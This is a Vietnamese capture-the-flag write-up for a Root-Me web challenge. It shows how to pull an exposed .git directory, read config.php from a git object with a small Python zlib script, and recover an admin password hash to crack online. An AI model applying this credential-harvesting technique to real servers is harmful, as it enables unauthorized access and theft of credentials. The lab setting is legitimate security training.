# Insecure Code Management

## Solution

Bằng cách đọc các tài nguyên đã cho, trước tiên kiểm tra địa chỉ: `http://challenge01.root-me.org/web-serveur/ch61/.git/` cho thấy nội dung thư mục .git.

Có thể download file ở đó và sau đó phân tích cú pháp bằng `gin`:

```
pip3 install gin
gin [downloaded index folder]/index
```

Điều này cung cấp một số thông tin thú vị:

```
[entry]
 entry = 1
 ctime = 1570126972.5167503
 mtime = 1569244477.4367204
 dev = 64512
 ino = 497048
 mode = 100644
 uid = 1001
 gid = 33
 size = 109
 sha1 = 663fe35facfd983a948d221c769438f230eb18ef
 flags = 10
 assume-valid = False
 extended = False
 stage = (False, False)
 name = config.php
```

Thấy ở đây một commit chỉnh sửa tệp config.php (tệp thường chứa thông tin xác thực quản trị viên ban đầu)

Vì vậy sử dụng giá trị `sha1`, kiểm tra địa chỉ sau:

```
http://challenge01.root-me.org/web-serveur/ch61/.git/objects/66/3fe35facfd983a948d221c769438f230eb18ef
```

dẫn đến một tệp nén zlib

Cuối cùng giải nén nó bằng một tập lệnh python đơn giản:

```
import zlib
file = '3fe35facfd983a948d221c769438f230eb18ef'
compressed = open(file, 'rb').read()
decompressed = zlib.decompress(compressed)
print decompressed
```

Điều này mang lại những thông tin mong muốn:

```
blob 109 <?php
       $username = "admin";
       $password = "0c25a741349bfdcc1e579c8cd4a931fca66bdb49b9f042c4d92ae1bfa3176d8c";
```

COMMIT_EDITMSG chứa thông báo `blue team want sha256!!!!!!!!!`, vì vậy sử dụng trang web này: `https://hashkiller.co.uk/Cracker/SHA256` để crack $password trước đó để lấy flag.